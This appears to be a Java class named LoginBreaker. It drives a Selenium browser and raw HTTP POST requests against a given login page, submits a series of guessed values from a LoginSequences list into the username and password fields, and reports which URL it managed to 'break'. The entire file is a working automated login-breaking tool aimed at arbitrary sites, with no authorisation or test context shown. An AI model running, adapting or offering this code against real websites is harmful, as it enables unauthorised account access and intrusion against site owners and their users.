package com.george.tailor.breaker;

import java.io.InputStream;
import java.io.StringWriter;
import java.util.ArrayList;
import java.util.List;

import org.apache.commons.io.IOUtils;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.openqa.selenium.Alert;
import org.openqa.selenium.By;
import org.openqa.selenium.Keys;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.support.ui.ExpectedConditions;

import com.george.tailor.data.LoginSequences;

public class LoginBreaker {

	public static Boolean checkEligibility(String url, WebDriver driver){
		Boolean submit = false;
		Boolean login = false;
		Boolean password = false;
		
		driver.get(url);
		List<WebElement> webElements = driver.findElements(By.tagName("input"));
		for(WebElement element : webElements){
			String type = element.getAttribute("type");
			if("submit".equals(type)){
				submit = true;
			}
			if("password".equals(type)){
				password = true;
			}
			//TODO: make up something smarter than that
			if("text".equals(type)){
				login = true;
			}
		}
		//TODO: extend for more complex login pages
		if((submit && login) || (login && password))
			return true;
		return false;
	}
	
	public void loginBreakTry(String url, WebDriver driver, int sequence){
		driver.get(url);
		WebElement loginWebElement = null;
		WebElement passWebElement = null;
		WebElement submitWebElement = null;
		WebElement hiddenWebElement = null;
		List<WebElement> webElements = driver.findElements(By.tagName("input"));
		for(WebElement element : webElements){
			String type = element.getAttribute("type");
			if("submit".equals(type)){
				submitWebElement = element;
			}
			if("password".equals(type)){
				passWebElement = element;
			}
			if("text".equals(type)){
				loginWebElement = element;
			}
			if("hidden".equals(type)){
				hiddenWebElement = element;
			}
		}
		trySequences(loginWebElement, passWebElement, submitWebElement, hiddenWebElement, driver, sequence);
	}
	
	public void trySequences(WebElement login, WebElement pass, WebElement submit, WebElement hidden, WebDriver driver, int sequence){
		LoginSequences[] loginSequences = LoginSequences.values();
		if(sequence >= loginSequences.length){
			tryPostingData(driver, login, pass, submit, hidden, loginSequences, 0);
			System.out.println("FAILED to break " + driver.getCurrentUrl() + ". Run out of sequences");
			return;
		}
		String responseText = "";
		try{			
			login.click();
			login.sendKeys(loginSequences[sequence].toString());
			pass.click();
			pass.sendKeys(loginSequences[sequence].toString());
			List<WebElement> webElementsBeforeSubmit = driver.findElements(By.tagName("input"));
			try{
				submit.click();		
			} catch (Exception e){
				pass.sendKeys(Keys.ENTER);
			}
			//alert check
			isAlertPresent(driver);

			List<WebElement> webElementsAfterSubmit = driver.findElements(By.tagName("input"));
			//TODO remove for production. Replace with check if password field is present
			if(webElementsBeforeSubmit.size() > webElementsAfterSubmit.size()){
				responseText = "Succesfully";
			} else {
				try{
					WebElement response = driver.findElement(By.className("alert-box"));
					responseText = response.getText();
				} catch (Exception e) {
					responseText = "failed";
				}
			}
		} finally {
			nextStep(driver, responseText, sequence, loginSequences); 
		}		
	}
	
	public void nextStep(WebDriver driver, String responseText, int sequence, LoginSequences[] loginSequences){
		if(sequence >= loginSequences.length){
			System.out.println("FAILED to break " + driver.getCurrentUrl() + ". Run out of sequences");
			return;
		}
		if(responseText.contains("Succesfully")){
			System.out.println("SUCCESS to break " + driver.getCurrentUrl() + " with sequence " + loginSequences[sequence].toString());
		} else {
			//System.out.println("FAILED to break " + driver.getCurrentUrl() + " with sequence " + loginSequences[sequence].toString());
			sequence++;
			loginBreakTry(driver.getCurrentUrl(), driver, sequence);
		}
	}
	
	public void tryPostingData(WebDriver driver, WebElement login, WebElement pass, WebElement submit, WebElement hidden, LoginSequences[] loginSequences, int sequence){		
		if(sequence >= loginSequences.length){
			System.out.println("FAILED to break " + driver.getCurrentUrl() + ". Run out of sequences");
			return;
		}
		String responseString = "";
		try{
			HttpClient httpclient = HttpClients.createDefault();
			HttpPost httppost = new HttpPost(driver.getCurrentUrl());
	
			// Request parameters and other properties.
			List<NameValuePair> params = new ArrayList<NameValuePair>(2);		
			params.add(new BasicNameValuePair(login.getAttribute("name"), loginSequences[sequence].toString()));
			params.add(new BasicNameValuePair(pass.getAttribute("name"), loginSequences[sequence].toString()));
			try{
				params.add(new BasicNameValuePair(submit.getAttribute("name"), submit.getAttribute("value")));
			} catch (Exception e){
				params.add(new BasicNameValuePair(hidden.getAttribute("name"), hidden.getAttribute("value")));
			}
		
		
			httppost.setEntity(new UrlEncodedFormEntity(params, "UTF-8"));
	
			//Execute and get the response.
			HttpResponse response = httpclient.execute(httppost);
			HttpEntity entity = response.getEntity();

			if (entity != null) {
			    InputStream instream = entity.getContent();
			    try {
			    	StringWriter writer = new StringWriter();
			    	IOUtils.copy(instream, writer, "UTF-8");
			    	responseString = writer.toString();
			    } finally {
			        instream.close();
			    }
			}
		} catch (Exception e){
			e.printStackTrace();
		} finally {
			nextStepPosting(driver, responseString, sequence, loginSequences, login, pass, submit, hidden);
		}
	}
	
	public void nextStepPosting(WebDriver driver, String responseText, int sequence, LoginSequences[] loginSequences, WebElement login, WebElement pass, WebElement submit, WebElement hidden){
		if(sequence >= loginSequences.length){
			System.out.println("FAILED to break " + driver.getCurrentUrl() + ". Run out of sequences");
			return;
		}
		if(responseText.contains("Succesfully")){
			System.out.println("SUCCESS to break " + driver.getCurrentUrl() + " with sequence " + loginSequences[sequence].toString());
		} else {
			//System.out.println("FAILED to break " + driver.getCurrentUrl() + " with sequence " + loginSequences[sequence].toString());
			sequence++;
			tryPostingData(driver, login, pass, submit, hidden, loginSequences, sequence);
		}
	}
	void isAlertPresent(WebDriver driver) {
	    Alert alert = ExpectedConditions.alertIsPresent().apply(driver);
	    if(alert != null)
	    	alert.dismiss();
	}
}
